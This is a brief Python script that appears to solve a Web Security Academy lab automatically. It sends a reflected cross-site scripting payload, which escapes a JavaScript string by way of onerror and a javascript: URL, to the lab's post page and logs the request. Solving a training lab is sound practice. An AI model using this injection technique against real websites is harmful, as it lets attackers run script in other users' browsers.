from web_security_academy.core.logger import logger


def solve_lab(session):
    xss = "',a:onerror=alert,b:window.location='javascript:throw+1337"
    path = f"/post?postId=1&xss={xss}"
    session.get_path(path)
    logger.info(f'Visited path "{path}"')
